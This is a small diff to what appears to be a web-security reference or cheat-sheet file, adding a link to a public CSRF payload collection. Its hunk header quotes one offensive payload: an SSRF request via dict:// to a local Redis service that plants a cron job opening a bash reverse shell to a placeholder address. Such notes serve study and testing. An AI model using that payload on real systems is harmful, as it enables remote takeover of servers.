@@ -155,6 +155,7 @@ dict://127.0.0.1:6379/set -.- "\n\n\n* * * * * bash -i >\x26 /dev/tcp/<ip>/<port
 ### CSRF
 
 - https://n-pn.fr/t/1277-tout-sur-les-attack-csrf---cross-site-request-forgery
+- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection
 
 ### DOM - notions
 
